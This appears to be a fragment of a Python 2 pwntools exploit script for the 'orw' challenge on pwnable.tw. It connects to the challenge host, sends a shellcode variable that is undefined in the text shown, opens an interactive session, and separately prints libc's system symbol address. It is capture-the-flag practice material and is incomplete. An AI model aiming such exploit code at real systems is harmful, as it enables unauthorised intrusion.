from pwn import *
context(arch='i386',log_level='debug')
# conn=process("./orw")
conn=remote("chall.pwnable.tw",10001)
conn.recv()
conn.send(shellcode)
conn.interactive()

e=ELF('./libc-2.23.so')
# print hex(e.address)
# print hex(e.symbols['malloc'])
print hex(e.symbols['system'])